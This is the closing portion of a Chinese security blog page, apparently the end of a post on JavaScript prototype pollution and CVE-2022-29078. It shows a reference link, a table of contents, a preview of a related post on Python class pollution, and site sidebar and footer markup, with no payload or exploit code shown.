+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cigang4063/article/details/100686605?ops_request_misc=&request_id=&biz_id=102&utm_term=js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-100686605.142%5Ev102%5Econtrol&spm=1018.2226.3001.4187">JavaScript原型链污染：原理、危害与防御实战-CSDN博客</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a target="_blank" rel="noopener" href="http://www.baidu.com">Teaaa</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/JSPP/">http://example.com/JSPP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">choco</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">原型链污染</a><a class="post-meta__tags" href="/tags/Nodejs/">Nodejs</a><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a></div><div class="post-share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/PyPP/" title="Python原型链污染及极客原题详细分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Python原型链污染及极客原题详细分析</div></div><div class="info-2"><div class="info-item-1"> 有点浅，感觉一些底层细节仍需打磨  说到原型链污染，比较出名是Node.js、Python，但不是只有这两个，原型链污染本质不是语言专属漏洞，是「语言有可被外部控制的对象合并 &#x2F; 递归赋值 + 对象存在特殊原型属性」才会出现。 而大家口中标准的「原型链污染」实际上是Node.js正统原型链污染这种，而其实Python是仿原型链污染，因为Python本身并没有像JavaScript那样显式的 “原型” 概念，这里的 “原型链污染” 更多是一种类比，其核心是利用Python对象继承链上的属性查找机制，实现非预期的属性覆盖或方法劫持，从而引发安全问题。一般会叫它 Python 类污染（Class Pollution），虽然我们很多地方叫他原型链污染，但底层机制和 JS 不一样。 简单来说，Python中每个对象的 __class__ 指向所属类，类的 __bases__ 指向父类，构成属性查找链。访问属性时解释器沿链向上搜索；原型污染就是攻击者往这条链的祖先注入恶意属性 &#x2F; 方法，程序查找到被污染的值后，触发恶意代码。 原型污染之所以危险：程序在处理用户传入的 J...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/PyPP/" title="Python原型链污染及极客原题详细分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-11-13</div><div class="info-item-2">Python原型链污染及极客原题详细分析</div></div><div class="info-2"><div class="info-item-1"> 有点浅，感觉一些底层细节仍需打磨  说到原型链污染，比较出名是Node.js、Python，但不是只有这两个，原型链污染本质不是语言专属漏洞，是「语言有可被外部控制的对象合并 &#x2F; 递归赋值 + 对象存在特殊原型属性」才会出现。 而大家口中标准的「原型链污染」实际上是Node.js正统原型链污染这种，而其实Python是仿原型链污染，因为Python本身并没有像JavaScript那样显式的 “原型” 概念，这里的 “原型链污染” 更多是一种类比，其核心是利用Python对象继承链上的属性查找机制，实现非预期的属性覆盖或方法劫持，从而引发安全问题。一般会叫它 Python 类污染（Class Pollution），虽然我们很多地方叫他原型链污染，但底层机制和 JS 不一样。 简单来说，Python中每个对象的 __class__ 指向所属类，类的 __bases__ 指向父类，构成属性查找链。访问属性时解释器沿链向上搜索；原型污染就是攻击者往这条链的祖先注入恶意属性 &#x2F; 方法，程序查找到被污染的值后，触发恶意代码。 原型污染之所以危险：程序在处理用户传入的 J...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Teaaa</div><div class="author-info-description">一万年太久只争朝夕</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/chocoteaaa/chocoteaaa.github.io.git"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">扎根ing 😲</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6"><span class="toc-number">1.</span> <span class="toc-text">核心机制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number"></span> <span class="toc-text">前置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#prototype"><span class="toc-number">1.</span> <span class="toc-text">prototype</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proto"><span class="toc-number">2.</span> <span class="toc-text">__proto__</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B-%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">原型&amp;原型链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%8F%E4%B8%AA%E5%AF%B9%E8%B1%A1%E9%83%BD%E6%9C%89%E5%86%85%E9%83%A8%E5%8E%9F%E5%9E%8B"><span class="toc-number">3.1.</span> <span class="toc-text">每个对象都有内部原型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%93%BE%E7%9A%84%E7%BB%88%E7%82%B9%E6%98%AF-Object-prototype"><span class="toc-number">3.2.</span> <span class="toc-text">链的终点是 Object.prototype</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF"><span class="toc-number">4.</span> <span class="toc-text">原型链继承</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number"></span> <span class="toc-text">原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E6%9D%A1%E4%BB%B6"><span class="toc-number"></span> <span class="toc-text">污染条件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%90%E8%A1%8C%E8%A7%A3%E8%AF%BB"><span class="toc-number">1.</span> <span class="toc-text">逐行解读</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#merge-%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">merge 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-%E8%A7%A3%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">payload 解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8-merge-user-payload"><span class="toc-number">1.3.</span> <span class="toc-text">调用 merge (user, payload)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#let-visitor-%EF%BC%8C%E6%89%93%E5%8D%B0-visitor-isAdmin"><span class="toc-number">1.4.</span> <span class="toc-text">let visitor &#x3D; {}，打印 visitor.isAdmin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">核心原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E6%89%80%E9%9C%80%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">成功所需条件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE%E2%80%912022%E2%80%9129078"><span class="toc-number"></span> <span class="toc-text">CVE‑2022‑29078</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%85%B3%E9%94%AE%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">源码关键点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0Payload%E6%B5%8B%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">构造Payload测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E9%97%AE%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">遇到问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88Payload"><span class="toc-number">5.</span> <span class="toc-text">最终Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E9%99%B7%E9%98%B1"><span class="toc-number">6.</span> <span class="toc-text">操作陷阱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%B1%E6%AD%BBClaude%E4%BA%86"><span class="toc-number">7.</span> <span class="toc-text">爱死Claude了</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Py%E5%92%8CJS%E6%B1%A1%E6%9F%93%E5%8C%BA%E5%88%AB"><span class="toc-number"></span> <span class="toc-text">Py和JS污染区别</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JS-vs-Python"><span class="toc-number">1.</span> <span class="toc-text">JS vs Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E5%AF%B9%E6%AF%94"><span class="toc-number">2.</span> <span class="toc-text">对象模型对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%85%A5%E5%8F%A3%EF%BC%88Sink%EF%BC%89%E5%B7%AE%E5%BC%82"><span class="toc-number">3.</span> <span class="toc-text">污染入口（Sink）差异</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript"><span class="toc-number">3.1.</span> <span class="toc-text">JavaScript</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">3.2.</span> <span class="toc-text">Python</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E9%9D%A2%E3%80%81%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94"><span class="toc-number">4.</span> <span class="toc-text">影响面、利用方式对比</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E8%AF%86%E5%88%AB%E8%A6%81%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">审计识别要点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E9%80%9A%E7%82%B9-%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">共通点 &amp; 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B1%E5%90%8C%E7%82%B9%EF%BC%9A"><span class="toc-number">6.1.</span> <span class="toc-text">共同点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E5%8C%BA%E5%88%86%E8%AE%B0%E5%BF%86"><span class="toc-number">6.2.</span> <span class="toc-text">核心区分记忆</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number"></span> <span class="toc-text">参考</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/JSPP/" title="JS原型链污染（及CVE‑2022‑29078）及与Py的区别">JS原型链污染（及CVE‑2022‑29078）及与Py的区别</a><time datetime="2026-11-16T05:31:02.981Z" title="发表于 2026-11-16 13:31:02">2026-11-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/PyPP/" title="Python原型链污染及极客原题详细分析">Python原型链污染及极客原题详细分析</a><time datetime="2026-11-13T14:01:59.703Z" title="发表于 2026-11-13 22:01:59">2026-11-13</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2024 - 2026 By Teaaa</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.1.260810</a></span></div><div class="footer_custom_text">navy~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.1.260810"></script><script src="/js/main.js?v=5.7.1.260810"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="220,100,40" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.1.260810"></script></div></div></body></html>
